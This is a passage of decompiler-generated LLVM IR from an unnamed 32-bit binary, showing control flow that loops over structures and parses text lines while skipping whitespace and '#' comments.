  %v1_1000acd0 = phi i32 [ %v1_1000acd0.pre, %dec_label_pc_1000ac80.dec_label_pc_1000acd0_crit_edge ], [ 28, %dec_label_pc_1000acc8 ], [ 1, %dec_label_pc_1000acc0 ]
  %v4_1000acd0 = icmp eq i32 %v3_1000aca8, %v1_1000acd0
  br i1 %v4_1000acd0, label %dec_label_pc_1000ace4, label %dec_label_pc_1000acd8

dec_label_pc_1000acd8:                            ; preds = %dec_label_pc_1000acd0
  %v1_1000acd8 = inttoptr i32 %v0_1000aca8 to i32*
  %v2_1000acd8 = load i32, i32* %v1_1000acd8, align 4
  store i32 ptrtoint (i32* @global_var_1000ace0.307 to i32), i32* @lr, align 4
  %v1_1000acdc = call i32 @function_10007e48(i32 %v2_1000acd8)
  br label %dec_label_pc_1000ad64

dec_label_pc_1000ace4:                            ; preds = %dec_label_pc_1000acd0
  %v1_1000ace8 = add i32 %v0_1000aca8, 16
  %v2_1000ace8 = inttoptr i32 %v1_1000ace8 to i32*
  %v3_1000ace8 = load i32, i32* %v2_1000ace8, align 4
  store i32 %v3_1000ace8, i32* %r11.global-to-local, align 4
  %v0_1000acec = load i32, i32* @r24, align 4
  %v2_1000acec = sub i32 %tmp35, %v0_1000acec
  %v1_1000acf0 = add i32 %v0_1000aca8, 32
  %v2_1000acf0 = inttoptr i32 %v1_1000acf0 to i32*
  %v3_1000acf0 = load i32, i32* %v2_1000acf0, align 4
  store i32 %v3_1000acf0, i32* %r0.global-to-local, align 4
  %v1_1000acf4 = add i32 %v2_1000acec, -1
  %v1_1000acf8 = add i32 %v3_1000ace8, 4
  %v2_1000acfc = mul i32 %v1_1000acf4, %v1_1000acf8
  store i32 %v2_1000acfc, i32* %r11.global-to-local, align 4
  %v2_1000ad00 = add i32 %v0_1000aca8, 36
  %v3_1000ad00 = inttoptr i32 %v2_1000ad00 to i32*
  store i32 %v1_1000acf4, i32* %v3_1000ad00, align 4
  %v0_1000ad04 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ad04 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000ad04 = icmp ugt i32 %v0_1000ad04, %v1_1000ad04
  br i1 %v3_1000ad04, label %dec_label_pc_1000ad80, label %dec_label_pc_1000ad0c

dec_label_pc_1000ad0c:                            ; preds = %dec_label_pc_1000ace4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000ad14 = load i32, i32* @r31, align 4
  %v2_1000ad14 = add i32 %v1_1000ad14, 36
  %v3_1000ad14 = inttoptr i32 %v2_1000ad14 to i32*
  store i32 0, i32* %v3_1000ad14, align 4
  br label %dec_label_pc_1000ad64

dec_label_pc_1000ad1c:                            ; preds = %dec_label_pc_1000ac74
  %v3_1000ad1c = load i32, i32* %stack_var_-184, align 4
  store i32 268479780, i32* @lr, align 4
  %v1_1000ad20 = call i32 @function_10007e48(i32 %v3_1000ad1c)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000ad28 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000ad28 = icmp eq i32 %tmp29, %v1_1000ad28
  br i1 %v4_1000ad28, label %dec_label_pc_1000ad30, label %dec_label_pc_1000ad64

dec_label_pc_1000ad30:                            ; preds = %dec_label_pc_1000ad1c
  %v0_1000ad30 = load i32, i32* @r31, align 4
  %v1_1000ad30 = add i32 %v0_1000ad30, 16
  %v2_1000ad30 = inttoptr i32 %v1_1000ad30 to i32*
  %v3_1000ad30 = load i32, i32* %v2_1000ad30, align 4
  store i32 %v3_1000ad30, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000ad38 = icmp eq i32 %v3_1000ad30, %tmp28
  br i1 %v4_1000ad38, label %dec_label_pc_1000ad40, label %dec_label_pc_1000adc4

dec_label_pc_1000ad40:                            ; preds = %dec_label_pc_1000ad30
  %v1_1000ad40 = add i32 %v0_1000ad30, 36
  %v2_1000ad40 = inttoptr i32 %v1_1000ad40 to i32*
  %v3_1000ad40 = load i32, i32* %v2_1000ad40, align 4
  %v1_1000ad44 = add i32 %v0_1000ad30, 28
  %v2_1000ad44 = inttoptr i32 %v1_1000ad44 to i32*
  %v3_1000ad44 = load i32, i32* %v2_1000ad44, align 4
  store i32 %v3_1000ad44, i32* %r0.global-to-local, align 4
  %v2_1000ad48 = mul i32 %v3_1000ad40, %tmp28
  %v2_1000ad50 = add i32 %v3_1000ad44, %v2_1000ad48
  store i32 %v2_1000ad50, i32* @r3, align 4
  store i32 268479832, i32* @lr, align 4
  %v0_1000ad54 = call i32 @function_10006d8c()
  %v0_1000ad58 = load i32, i32* @r31, align 4
  %v1_1000ad58 = add i32 %v0_1000ad58, 36
  %v2_1000ad58 = inttoptr i32 %v1_1000ad58 to i32*
  %v3_1000ad58 = load i32, i32* %v2_1000ad58, align 4
  %v1_1000ad5c = add i32 %v3_1000ad58, 1
  store i32 %v1_1000ad5c, i32* %v2_1000ad58, align 4
  br label %dec_label_pc_1000ad64

dec_label_pc_1000ad64:                            ; preds = %dec_label_pc_1000ad1c, %dec_label_pc_1000ad0c, %dec_label_pc_1000acd8, %dec_label_pc_1000ad40
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000ad40 ], [ 0, %dec_label_pc_1000ad1c ], [ 0, %dec_label_pc_1000ad0c ], [ %stack_var_-88.118, %dec_label_pc_1000acd8 ]
  %v0_1000ad64 = load i32, i32* @r28, align 4
  %v1_1000ad64 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000ad64 = add i32 %v1_1000ad64, %v0_1000ad64
  store i32 %v2_1000ad64, i32* %r28.global-to-local, align 4
  %v0_1000ad68 = load i32, i32* @r24, align 4
  %v1_1000ad68 = add i32 %v0_1000ad68, 1
  store i32 %v1_1000ad68, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000ad70 = icmp slt i32 %v1_1000ad68, %tmp35
  br i1 %v2_1000ad70, label %dec_label_pc_1000ad78, label %dec_label_pc_1000ad80

dec_label_pc_1000ad78:                            ; preds = %dec_label_pc_1000ac2c, %dec_label_pc_1000ad64
  %v0_1000ac44 = phi i32 [ %v2_1000ad64, %dec_label_pc_1000ad64 ], [ %v2_1000ac10, %dec_label_pc_1000ac2c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000ad64 ], [ 1, %dec_label_pc_1000ac2c ]
  %v1_1000ad78 = load i32, i32* @r27, align 4
  %v2_1000ad78 = icmp slt i32 %v0_1000ac44, %v1_1000ad78
  br i1 %v2_1000ad78, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ad80

dec_label_pc_1000ad80:                            ; preds = %dec_label_pc_1000ac64, %dec_label_pc_1000ac2c, %dec_label_pc_1000ad78, %dec_label_pc_1000acb4, %dec_label_pc_1000ace4, %dec_label_pc_1000ad64, %dec_label_pc_1000acc8
  %v0_1000ad80 = load i32, i32* @r19, align 4
  store i32 268479880, i32* @lr, align 4
  %v1_1000ad84 = call i32 @function_100048e0(i32 %v0_1000ad80)
  %v3_1000ad8c = icmp eq i32 %arg5, 0
  %v0_1000ad9c = load i32, i32* @r30, align 4
  br i1 %v3_1000ad8c, label %dec_label_pc_1000ad9c, label %dec_label_pc_1000ad94

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad80
  %v2_1000ad94 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000ad9c, i32* %v2_1000ad94, align 4
  br label %dec_label_pc_1000ada4

dec_label_pc_1000ad9c:                            ; preds = %dec_label_pc_1000ad80
  store i32 268479908, i32* @lr, align 4
  %v1_1000ada0 = call i32 @function_10007e48(i32 %v0_1000ad9c)
  br label %dec_label_pc_1000ada4

dec_label_pc_1000ada4:                            ; preds = %dec_label_pc_1000ad94, %dec_label_pc_1000ad9c
  %v0_1000ada4 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268479920, i32* @lr, align 4
  %v1_1000adac = call i32 @function_10007e48(i32 %v0_1000ada4)
  store i32 ptrtoint (i32* @global_var_10012b0c.295 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000aea8

dec_label_pc_1000adc4:                            ; preds = %dec_label_pc_1000ad30
  %v1_1000adc4 = inttoptr i32 %v0_1000ad30 to i32*
  %v2_1000adc4 = load i32, i32* %v1_1000adc4, align 4
  store i32 268479948, i32* @lr, align 4
  %v1_1000adc8 = call i32 @function_10007e48(i32 %v2_1000adc4)
  br label %dec_label_pc_1000adcc

dec_label_pc_1000adcc:                            ; preds = %dec_label_pc_1000abdc, %dec_label_pc_1000ab44, %dec_label_pc_1000ac64, %dec_label_pc_1000ac5c, %dec_label_pc_1000ab5c, %dec_label_pc_1000ab24, %dec_label_pc_1000adc4
  %v0_1000adcc = load i32, i32* %r17.global-to-local, align 4
  %v3_1000adcc = icmp eq i32 %v0_1000adcc, 0
  br i1 %v3_1000adcc, label %dec_label_pc_1000add4, label %dec_label_pc_1000ae24

dec_label_pc_1000add4:                            ; preds = %dec_label_pc_1000adcc
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v0_1000adf0 = call i32 @function_10008c84()
  %v0_1000adf8 = call i32 @function_10008c7c()
  %v3_1000ae00 = load i32, i32* @global_var_100104cc.299, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v1_1000ae0c = add i32 %v3_1000ae00, -1
  store i32 %v1_1000ae0c, i32* %r29.global-to-local, align 4
  %v0_1000ae10 = call i32 @function_10008c84()
  %v0_1000ae14 = load i32, i32* @r22, align 4
  %v2_1000ae14 = icmp slt i32 %v0_1000ae14, %v1_1000ae0c
  br i1 %v2_1000ae14, label %dec_label_pc_1000ae1c, label %dec_label_pc_1000ae24

dec_label_pc_1000ae1c:                            ; preds = %dec_label_pc_1000add4
  %v1_1000ae1c = add i32 %v0_1000ae14, 1
  store i32 %v1_1000ae1c, i32* @r22, align 4
  br label %dec_label_pc_1000ae40thread-pre-split.backedge

dec_label_pc_1000ae40thread-pre-split.backedge:   ; preds = %dec_label_pc_1000ae1c, %dec_label_pc_1000abc4, %dec_label_pc_1000ae3c
  %v0_1000ae40.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000ae40.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000a934.lr.ph, label %dec_label_pc_1000ae58

dec_label_pc_1000ae24:                            ; preds = %dec_label_pc_1000aad4, %dec_label_pc_1000add4, %dec_label_pc_1000adcc, %dec_label_pc_1000aaec
  %v0_1000ae24 = load i32, i32* @r26, align 4
  %v1_1000ae24 = add i32 %v0_1000ae24, 1
  store i32 %v1_1000ae24, i32* %r0.global-to-local, align 4
  %v1_1000ae28 = load i32, i32* @r23, align 4
  %v2_1000ae28 = srem i32 %v1_1000ae24, %v1_1000ae28
  store i32 %v2_1000ae28, i32* @r26, align 4
  %v5_1000ae30 = icmp eq i32 %v2_1000ae28, 0
  br i1 %v5_1000ae30, label %dec_label_pc_1000ae38, label %dec_label_pc_1000ae3c

dec_label_pc_1000ae38:                            ; preds = %dec_label_pc_1000ae24
  %v0_1000ae38 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000ae38 = add i32 %v0_1000ae38, 1
  store i32 %v1_1000ae38, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000ae3c

dec_label_pc_1000ae3c:                            ; preds = %dec_label_pc_1000ae24, %dec_label_pc_1000ae38
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000ae40thread-pre-split.backedge

dec_label_pc_1000a934.lr.ph:                      ; preds = %dec_label_pc_1000a934.lr.ph.lr.ph, %dec_label_pc_1000ae40thread-pre-split.backedge
  br label %dec_label_pc_1000a934

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000a8ac, %dec_label_pc_1000a8a4, %dec_label_pc_1000a89c, %dec_label_pc_1000a854
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000ae58

dec_label_pc_1000ae58:                            ; preds = %dec_label_pc_1000ae40thread-pre-split.backedge, %dec_label_pc_1000a944, %dec_label_pc_1000aa20, %dec_label_pc_1000aae4, %dec_label_pc_1000a8b8, %dec_label_pc_1000ae4c
  %v0_1000ae58 = call i32 @function_10009548()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000ae60 = inttoptr i32 %v0_1000ae58 to i32*
  store i32 -1, i32* %v2_1000ae60, align 4
  %v0_1000ae64 = load i32, i32* @r25, align 4
  store i32 %v0_1000ae64, i32* @r20, align 4
  br label %dec_label_pc_1000ae68

dec_label_pc_1000ae68:                            ; preds = %dec_label_pc_1000ac04, %dec_label_pc_1000ae58
  %v0_1000ae68 = load i32, i32* @r19, align 4
  %v3_1000ae68 = icmp eq i32 %v0_1000ae68, -1
  br i1 %v3_1000ae68, label %dec_label_pc_1000ae78, label %dec_label_pc_1000ae70

dec_label_pc_1000ae70:                            ; preds = %dec_label_pc_1000ae68
  store i32 268480120, i32* @lr, align 4
  %v1_1000ae74 = call i32 @function_100048e0(i32 %v0_1000ae68)
  br label %dec_label_pc_1000ae78

dec_label_pc_1000ae78:                            ; preds = %dec_label_pc_1000ae68, %dec_label_pc_1000ae70
  %v0_1000ae78 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268480132, i32* @lr, align 4
  %v1_1000ae80 = call i32 @function_10007e48(i32 %v0_1000ae78)
  %v0_1000ae84 = load i32, i32* @r30, align 4
  store i32 268480140, i32* @lr, align 4
  %v1_1000ae88 = call i32 @function_10007e48(i32 %v0_1000ae84)
  %v0_1000ae8c = load i32, i32* @r26, align 4
  %v3_1000ae8c = icmp eq i32 %v0_1000ae8c, -1
  br i1 %v3_1000ae8c, label %dec_label_pc_1000aed8, label %dec_label_pc_1000ae94

dec_label_pc_1000ae94:                            ; preds = %dec_label_pc_1000ae78
  store i32 ptrtoint (i32* @global_var_10012b0c.295 to i32), i32* %r29.global-to-local, align 4
  %v2_1000aea0 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000aea8

dec_label_pc_1000aea8:                            ; preds = %dec_label_pc_1000ada4, %dec_label_pc_1000ae94
  %storemerge68 = phi i32 [ %v2_1000aea0, %dec_label_pc_1000ae94 ], [ %v2_1000a8d8, %dec_label_pc_1000ada4 ]
  %v1_1000aeac.pre-phi = phi i32 [ %v2_1000aea0, %dec_label_pc_1000ae94 ], [ %v2_1000a8d8, %dec_label_pc_1000ada4 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000aeac.pre-phi, i32* @r3, align 4
  %v0_1000aeb0 = call i32 @function_10008c84()
  %v0_1000aeb8 = call i32 @function_10008c7c()
  %v0_1000aec0 = load i32, i32* @r26, align 4
  store i32 %v0_1000aec0, i32* @global_var_100104c4.296, align 4
  store i32 %v1_1000aeac.pre-phi, i32* @r3, align 4
  %v0_1000aed0 = load i32, i32* @r20, align 4
  %v1_1000aed0 = trunc i32 %v0_1000aed0 to i16
  store i16 %v1_1000aed0, i16* @global_var_100103dc.297, align 2
  %v0_1000aed4 = call i32 @function_10008c84()
  br label %dec_label_pc_1000aed8

dec_label_pc_1000aed8:                            ; preds = %dec_label_pc_1000ae78, %dec_label_pc_1000aea8
  store i32 %v0_1000a858, i32* %r0.global-to-local, align 4
  %v0_1000aedc = load i32, i32* @r27, align 4
  ret i32 %v0_1000aedc

; uselistorder directives
  uselistorder i32 %v1_1000aeac.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000ae28, { 1, 0 }
  uselistorder i32 %v0_1000ad9c, { 1, 0 }
  uselistorder i32 %v1_1000ad78, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000ac44, { 1, 0 }
  uselistorder i32 %v1_1000ad68, { 1, 0 }
  uselistorder i32 %v0_1000ad30, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000acf4, { 1, 0 }
  uselistorder i32 %v0_1000ac80, { 2, 1, 0 }
  uselistorder i32 %v0_1000ac1c, { 1, 0 }
  uselistorder i32 %v2_1000ac10, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000ab34, { 1, 0 }
  uselistorder i32 %v1_1000aa34, { 1, 0 }
  uselistorder i32 %v1_1000aa08, { 1, 0 }
  uselistorder i32 %v1_1000a9d4, { 1, 0 }
  uselistorder i32 %v1_1000a96c, { 1, 0 }
  uselistorder i32 %v2_1000a8d8, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32 %v1_1000a88c, { 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 15, 16, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 13, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 34, 14, 16, 33, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007c08, { 3, 4, 2, 1, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_10007ba4, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10007cbc, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 2, 10, 3, 8, 4, 5, 0, 6, 13, 14, 11, 12, 9, 7 }
  uselistorder i32 (i32)* @function_10007770, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10007068, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_100048e0, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i16* @global_var_100103dc.297, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 (i32)* @function_10007cf0, { 5, 4, 6, 3, 2, 7, 8, 1, 0 }
  uselistorder i32 512, { 3, 4, 0, 1, 2, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000aed8, { 1, 0 }
  uselistorder label %dec_label_pc_1000aea8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae78, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae68, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae58, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000a934.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae24, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000ae40thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000adcc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000ada4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad80, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000ad78, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad64, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000acd0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ac0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac04, { 1, 0 }
  uselistorder label %dec_label_pc_1000aaa8, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a944, { 1, 0 }
}

define i32 @function_1000aef0() local_unnamed_addr {
dec_label_pc_1000aef0:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000af10 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000af10, i32* @r3, align 4
  %v0_1000af18 = call i32 @function_10008c84()
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r3.global-to-local, align 4
  %v0_1000af20 = call i32 @function_10008c7c()
  store i32 %v0_1000af20, i32* %r3.global-to-local, align 4
  %v3_1000af28 = load i32, i32* @global_var_100104c8.251, align 4
  %v2_1000af2c = icmp sgt i32 %v3_1000af28, 0
  br i1 %v2_1000af2c, label %dec_label_pc_1000b1a4, label %dec_label_pc_1000af34

dec_label_pc_1000af34:                            ; preds = %dec_label_pc_1000aef0
  store i32 ptrtoint ([17 x i8]* @global_var_1000f330.310 to i32), i32* %r3.global-to-local, align 4
  store i32 268480332, i32* @lr, align 4
  %v3_1000af48 = call i32 @function_10004ca0(i32 ptrtoint ([17 x i8]* @global_var_1000f330.310 to i32), i32 ptrtoint (i32* @global_var_1000f344.309 to i32))
  store i32 %v3_1000af48, i32* %r3.global-to-local, align 4
  store i32 %v3_1000af48, i32* @r26, align 4
  %v3_1000af4c = icmp eq i32 %v3_1000af48, 0
  br i1 %v3_1000af4c, label %dec_label_pc_1000af54, label %dec_label_pc_1000b168.preheader

dec_label_pc_1000af54:                            ; preds = %dec_label_pc_1000af34
  %v0_1000af58 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000f348.311 to i32), i32* %r3.global-to-local, align 4
  store i32 268480356, i32* @lr, align 4
  %v3_1000af60 = call i32 @function_10004ca0(i32 ptrtoint ([24 x i8]* @global_var_1000f348.311 to i32), i32 %v0_1000af58)
  store i32 %v3_1000af60, i32* %r3.global-to-local, align 4
  store i32 %v3_1000af60, i32* @r26, align 4
  %v3_1000af64 = icmp eq i32 %v3_1000af60, 0
  br i1 %v3_1000af64, label %dec_label_pc_1000b198, label %dec_label_pc_1000b168.preheader

dec_label_pc_1000b168.preheader:                  ; preds = %dec_label_pc_1000af34, %dec_label_pc_1000af54
  %v0_1000b17416 = phi i32 [ %v3_1000af48, %dec_label_pc_1000af34 ], [ %v3_1000af60, %dec_label_pc_1000af54 ]
  %v2_1000b168 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000af742 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000b058 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000b168

dec_label_pc_1000af70:                            ; preds = %dec_label_pc_1000af88
  %v1_1000af70 = add i32 %v0_1000b0309, 1
  store i32 %v1_1000af70, i32* %r3.global-to-local, align 4
  %v1_1000af74 = inttoptr i32 %v1_1000af70 to i8*
  %v2_1000af74 = load i8, i8* %v1_1000af74, align 1
  %v3_1000af74 = zext i8 %v2_1000af74 to i32
  store i32 %v3_1000af74, i32* %r11.global-to-local, align 4
  %v3_1000af7c = icmp eq i8 %v2_1000af74, 0
  br i1 %v3_1000af7c, label %dec_label_pc_1000b168.backedge, label %dec_label_pc_1000af88

dec_label_pc_1000af88:                            ; preds = %dec_label_pc_1000af88.lr.ph, %dec_label_pc_1000af70
  %v0_1000af8c.in = phi i32 [ %v3_1000af744, %dec_label_pc_1000af88.lr.ph ], [ %v3_1000af74, %dec_label_pc_1000af70 ]
  %v0_1000afa0 = phi i32 [ %v3_1000af744, %dec_label_pc_1000af88.lr.ph ], [ %v3_1000af74, %dec_label_pc_1000af70 ]
  %v0_1000b0309 = phi i32 [ %v2_1000b168, %dec_label_pc_1000af88.lr.ph ], [ %v1_1000af70, %dec_label_pc_1000af70 ]
  %v0_1000af8c = mul nuw nsw i32 %v0_1000af8c.in, 2
  %v2_1000af8c = add i32 %v0_1000af8c, %v3_1000af88.pre
  %v3_1000af8c = inttoptr i32 %v2_1000af8c to i16*
  %v4_1000af8c = load i16, i16* %v3_1000af8c, align 2
  %v1_1000af90 = and i16 %v4_1000af8c, 32
  %v3_1000af90 = icmp eq i16 %v1_1000af90, 0
  br i1 %v3_1000af90, label %dec_label_pc_1000af98, label %dec_label_pc_1000af70

dec_label_pc_1000af98:                            ; preds = %dec_label_pc_1000af88
  %v3_1000af98 = icmp eq i32 %v0_1000afa0, 10
  br i1 %v3_1000af98, label %dec_label_pc_1000b168.backedge, label %dec_label_pc_1000afa0

dec_label_pc_1000b168.backedge:                   ; preds = %dec_label_pc_1000af70, %dec_label_pc_1000b11c, %dec_label_pc_1000b124, %dec_label_pc_1000b15c, %dec_label_pc_1000af74.preheader, %dec_label_pc_1000af98, %dec_label_pc_1000afa0, %dec_label_pc_1000b0c4
  %v0_1000b174.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000b168

dec_label_pc_1000afa0:                            ; preds = %dec_label_pc_1000af98
  %v3_1000afa0 = icmp eq i32 %v0_1000afa0, 35
  br i1 %v3_1000afa0, label %dec_label_pc_1000b168.backedge, label %dec_label_pc_1000afa8

dec_label_pc_1000afa8:                            ; preds = %dec_label_pc_1000afa0
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000af10, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000b03010 = inttoptr i32 %v0_1000b0309 to i8*
  %v2_1000b03011 = load i8, i8* %v1_1000b03010, align 1
  %v3_1000b03414 = icmp eq i8 %v2_1000b03011, 0
  br i1 %v3_1000b03414, label %dec_label_pc_1000b044, label %dec_label_pc_1000b03c

dec_label_pc_1000afbc:                            ; preds = %dec_label_pc_1000b03c
  %v1_1000afbc = mul i32 %v0_1000afbc, 4
  %v3_1000afc0 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000afc0, i32* %r11.global-to-local, align 4
  %v1_1000afc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000afc4 = add i32 %v1_1000afc4, %v1_1000afbc
  %v2_1000afc8 = add i32 %v2_1000afc4, 16
  %v3_1000afc8 = inttoptr i32 %v2_1000afc8 to i32*
  store i32 %v0_1000afc8, i32* %v3_1000afc8, align 4
  %v0_1000afd4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000afd4

dec_label_pc_1000afd0:                            ; preds = %dec_label_pc_1000afe8
  %v1_1000afd0 = add i32 %v0_1000afd0, 1
  store i32 %v1_1000afd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000afd4

dec_label_pc_1000afd4:                            ; preds = %dec_label_pc_1000afbc, %dec_label_pc_1000afd0
  %v0_1000afd0 = phi i32 [ %v0_1000afd4.pre, %dec_label_pc_1000afbc ], [ %v1_1000afd0, %dec_label_pc_1000afd0 ]
  %v1_1000afd4 = inttoptr i32 %v0_1000afd0 to i8*
  %v2_1000afd4 = load i8, i8* %v1_1000afd4, align 1
  %v3_1000afd8 = icmp eq i8 %v2_1000afd4, 0
  br i1 %v3_1000afd8, label %dec_label_pc_1000b004, label %dec_label_pc_1000afe8

dec_label_pc_1000afe8:                            ; preds = %dec_label_pc_1000afd4
  %v3_1000afe0 = icmp eq i8 %v2_1000afd4, 10
  %v3_1000afd4 = zext i8 %v2_1000afd4 to i32
  %v1_1000afdc = mul nuw nsw i32 %v3_1000afd4, 2
  %v1_1000afe8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000afe8 = add i32 %v1_1000afe8, %v1_1000afdc
  %v3_1000afe8 = inttoptr i32 %v2_1000afe8 to i16*
  %v4_1000afe8 = load i16, i16* %v3_1000afe8, align 2
  %v1_1000afec = and i16 %v4_1000afe8, 32
  %v3_1000afec.not = icmp ne i16 %v1_1000afec, 0
  %brmerge = or i1 %v3_1000afe0, %v3_1000afec.not
  br i1 %brmerge, label %dec_label_pc_1000b004, label %dec_label_pc_1000afd0

dec_label_pc_1000affc:                            ; preds = %dec_label_pc_1000b018
  %v0_1000affc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000affc = trunc i32 %v0_1000affc to i8
  store i8 %v1_1000affc, i8* %v1_1000b004, align 1
  %v0_1000b000 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b000 = add i32 %v0_1000b000, 1
  store i32 %v1_1000b000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b004

dec_label_pc_1000b004:                            ; preds = %dec_label_pc_1000afe8, %dec_label_pc_1000afd4, %dec_label_pc_1000affc
  %v0_1000b030 = phi i32 [ %v1_1000b000, %dec_label_pc_1000affc ], [ %v0_1000afd0, %dec_label_pc_1000afd4 ], [ %v0_1000afd0, %dec_label_pc_1000afe8 ]
  %v1_1000b004 = inttoptr i32 %v0_1000b030 to i8*
  %v2_1000b004 = load i8, i8* %v1_1000b004, align 1
  %v3_1000b004 = zext i8 %v2_1000b004 to i32
  %v3_1000b008 = icmp eq i8 %v2_1000b004, 0
  %v1_1000b00c = mul nuw nsw i32 %v3_1000b004, 2
  store i32 %v1_1000b00c, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b008, label %dec_label_pc_1000b02c, label %dec_label_pc_1000b018

